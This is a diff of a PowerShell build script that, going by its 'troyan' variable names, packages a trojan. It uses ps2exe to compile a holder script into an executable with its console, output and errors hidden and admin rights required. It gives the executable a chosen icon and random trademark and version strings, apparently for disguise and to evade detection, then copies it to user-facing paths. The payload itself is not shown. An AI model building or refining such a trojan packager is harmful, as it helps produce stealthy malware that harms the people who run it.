@@ -23,18 +23,18 @@ function Get-RandomVersion {
     "$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random))"
 }
 
-if (-not (Test-Path -Path $server.userDelphiIco))
+if (-not (Test-Path -Path $server.userTroyanIco))
 {
     Copy-Item -Path $server.defaultIco -Destination $server.troyanIco -Force
 } else {
-    Copy-Item -Path $server.userDelphiIco -Destination $server.troyanIco -Force
+    Copy-Item -Path $server.userTroyanIco -Destination $server.troyanIco -Force
 }
 
 Remove-FileIfExists -filePath $server.troyanExe
-Remove-FileIfExists -filePath $server.userDelphiExe
+Remove-FileIfExists -filePath $server.userTroyanExe
 
 Invoke-ps2exe `
-    -inputFile $server.troyanScript `
+    -inputFile $server.troyanHolder `
     -outputFile $server.troyanExe `
     -iconFile $server.troyanIco `
     -STA -x86 -UNICODEEncoding -requireAdmin -noOutput -noError -noConsole `
@@ -45,5 +45,5 @@ Invoke-ps2exe `
     -trademark (Get-RandomString) `
     -version (Get-RandomVersion)
 
-Copy-Item -Path $server.troyanIco -Destination $server.userDelphiIco -Force
-Copy-Item -Path $server.troyanExe -Destination $server.userDelphiExe -Force
+Copy-Item -Path $server.troyanIco -Destination $server.userTroyanIco -Force
+Copy-Item -Path $server.troyanExe -Destination $server.userTroyanExe -Force
